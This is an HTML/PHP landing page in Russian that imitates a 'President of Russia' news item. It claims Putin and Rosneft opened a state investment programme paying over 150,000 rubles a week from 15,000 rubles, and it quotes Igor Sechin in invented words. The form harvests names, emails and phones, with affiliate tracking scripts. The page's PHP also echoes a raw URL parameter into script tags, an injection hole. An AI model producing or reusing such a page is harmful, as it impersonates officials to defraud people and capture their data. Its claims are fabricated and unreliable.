<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Президент России</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
      rel="stylesheet"
    />
    <link rel="icon" type="image/png" href="img/favicon-32x32.png" sizes="32x32" />
    <link rel="stylesheet" href="css/intlTelInput.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/modal.css" />

    <!-- JS adapter -->
    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie = name + '=' + value + ';path=/;expires=' + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!'{subid}'.match('{')) {
          return '{subid}';
        }
        var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (clientSubid && !clientSubid.match('>')) {
          return clientSubid;
        }
        if (params.get('_subid')) {
          return params.get('_subid');
        }
        if (params.get('subid')) {
          return params.get('subid');
        }
        if (getCookie('subid')) {
          return getCookie('subid');
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!'{token}'.match('{')) {
          return '{token}';
        }
        var clientToken = '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (clientToken && !clientToken.match('>')) {
          return clientToken;
        }
        if (params.get('_token')) {
          return params.get('_token');
        }
        if (params.get('token')) {
          return params.get('token');
        }
        if (getCookie('token')) {
          return getCookie('token');
        }
        return null;
      }

      // function getPixel() {
      //     var params = new URLSearchParams(document.location.search.substr(1));
      //     if (!'{pixel}'.match('{')) {
      //         return '{pixel}';
      //     }
      //     if (params.get('pixel')) {
      //         return params.get('pixel')
      //     }

      //     if (getCookie('pixel')) {
      //         return getCookie('pixel');
      //     }

      //     return null;
      // }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!'{idpxl}'.match('{')) {
          return '{idpxl}';
        }
        if (params.get('idpxl')) {
          return params.get('idpxl');
        }

        if (getCookie('idpxl')) {
          return getCookie('idpxl');
        }

        return null;
      }

      if (typeof URLSearchParams === 'function') {
        document.addEventListener('DOMContentLoaded', function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set('_token', token);
          setCookie('idpxl', pixel);
          setCookie('token', token);
          setCookie('subid', subid);

          // Adds params to the links
          document.querySelectorAll('a').forEach(function (link) {
            var url = new URL(link.href);
            params.forEach(function (v, k) {
              url.searchParams.append(k, v);
            });
            link.href = url.toString();
          });

          // Adds params as hidden inputs to the forms
          document.querySelectorAll('form').forEach(function (form) {
            params.forEach(function (v, k) {
              var input = document.createElement('input');
              input.type = 'hidden';
              input.name = k;
              input.value = v;

              form.append(input);
            });
          });
        });
      }
    </script>
    <!-- End JS adapter -->

    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>"
    ></script>
    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
        bgdataLayer.push(arguments);
      }
      bge('init', "<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>");
    </script>
  </head>
  <body>
    <div class="wrapper">
      <header class="header">
        <img src="img/logo.svg" alt="logo" />
        <div class="head-title">
          <h1 class="main-title">Президент России</h1>
          <p class="news">Новости</p>
        </div>
      </header>

      <main class="main">
        <div class="container">
          <div class="body-content">
            <h2 class="body-title">
              Президент открыл доступ к заработку на проектах РОСНЕФТЬ всем гражданам России
            </h2>
            <img src="img/image3.jpg" alt="main" />
            <span class="desc">
              Владимир Путин и директор «Роснефть» Игорь Сечин подписывают указ об открытии
              программы инвестирования для граждан.
            </span>
            <p class="text">
              В связи с санкциями запада и усложнениями экономики Владимир Владимирович Путин открыл
              доступ к инвестициям в компанию <a class="black" href="#scroll"><b>РОСНЕФТЬ</b></a
              >, первые инвесторы уже зарабатывают свыше
              <a class="black" href="#scroll"><b>150 000 рублей</b></a> пассивных доходов в неделю.
              <a class="black" href="#scroll"><b> Рассказываем как это работает</b></a
              >: чтобы стать участником государственной программы понадобится лишь телефон или
              компьютер и 15-20 минут времени в день. Вы регистрируетесь на платформе, менеджер
              создает вам “личный кабинет инвестора” с его помощью вы покупаете акции и выставляете
              их на свободные торги. Как заявил руководитель компании
              <a href="#scroll" class="black"><b>РОСНЕФТЬ</b></a>
              Игорь Сечин:
            </p>
            <p class="text italic">
              “Заработать на инвестициях в нефть теперь может абсолютно каждый житель страны, без
              каких-либо инвестиционных навыков, ведь менеджеры компании
              <a class="black" href="#scroll"><b>РОСНЕФТЬ</b></a> всегда помогут вам в этом”.
            </p>
            <p class="text">
              Отметим что проект уже показывает невероятно положительный рост благосостояния граждан
              России.
              <a class="black" href="#scroll"><b>Для первой тысячи участников</b></a>
              государственной инициативы был снижен порог входа и принимаются инвестиции
              <a href="#scroll" class="black"><b>всего от 15 000 рублей</b></a
              >, однако чем больше вы инвестируете, тем существеннее будет и ваш доход
              соответственно. Для получения доступа к инвестиционной платформе пожалуйста оставьте
              ваши данные для авторизации:
            </p>
          </div>

          <style>
            .form-wrap {
              display: flex;
              justify-content: center;
              align-items: center;
            }
          </style>

         <div class="form-wrap">
          <form class="form-container" id="formTop" method="post" autocomplete="off">
            <div class="form_group--name">
              <input
                class="input-email--validate register-form__input register-form__email__input form-control"
                name="first_name"
                id="first_name"
                placeholder="Имя"
                required
              />
            </div>
            <div class="form_group--name">
              <input
                class="input-email--validate register-form__input register-form__email__input form-control"
                placeholder="Фамилия"
                name="last_name"
                id="last_name"
                required
              />
            </div>
            <div class="form_group--email">
              <input
                class="input-email--validate register-form__input register-form__email__input form-control"
                type="email"
                name="email"
                id="email"
                placeholder="Email"
                required
              />
            </div>
            <div class="form_input--group">
              <input
                class="form-control register-form__input"
                type="tel"
                autocomplete="on"
                id="phone"
                name="phone"
                required
                tabindex="0"
              />
            </div>
            <div class="form_group--button">
              <button class="send-form btn btn-primary btn_send" type="submit">
                <span class="button--inner">Начать зарабатывать</span>
              </button>
            </div>
          </form>
         </div>
        </div>
      </main>

      <footer class="footer">
        <div class="container">
          <div class="footer-wrap">
            <div class="footer-title" id="scroll"></div>
            <span>Опубликован в разделах: Новости, Выступления и стенограммы</span>
            <span class="time">Дата публикации: 7 марта 13:15</span>
          </div>
        </div>
      </footer>
    </div>

    <div class="modal-form" id="modalFailure">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы уже зарегистрированы на этот номер. Если вам нужна новая учетная запись, перейдите на
            регистрация на другой мобильный номер
          </h5>
        </div>
      </div>
    </div>

    <div class="modal-form" id="modalFailureEmail">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы уже зарегистрированы с этим адресом электронной почты. Если вам нужна новая учетная
            запись, зарегистрируйтесь другая электронная почта.
          </h5>
        </div>
      </div>
    </div>

    <div class="modal-form" id="modalInvalid">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы ввели неверный адрес электронной почты. Зарегистрируйтесь для получения другой
            электронной почты.
          </h5>
        </div>
      </div>
    </div>

    <script>
      var objToday = new Date(),
        dayOfMonth =
          today + (objToday.getDate() < 10) ? '0' + objToday.getDate() : objToday.getDate(),
        months = new Array(
          'янв',
          'фев',
          'мар',
          'апр',
          'май',
          'июн',
          'июл',
          'авг',
          'сен',
          'окт',
          'ноя',
          'дек',
        ),
        curMonth = months[objToday.getMonth()];

      var today = dayOfMonth + ' ' + curMonth + ',';

      document.getElementsByClassName('date-today')[0].textContent = today;
    </script>

    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"
      integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script src="js/checkCookiePhone.js"></script>
    <script src="js/jquery.validate.js"></script>
    <script src="js/intlTelInput.min.js"></script>
    <script src="js/jquery.maskedinput.js"></script>
    <script src="js/modal.js"></script>
    <script src="js/main.js"></script>
    <script src="js/submitForm.js"></script>
    <script src="js/utm.js"></script>
    <script src="js/scroll.js"></script>
  </body>
</html>
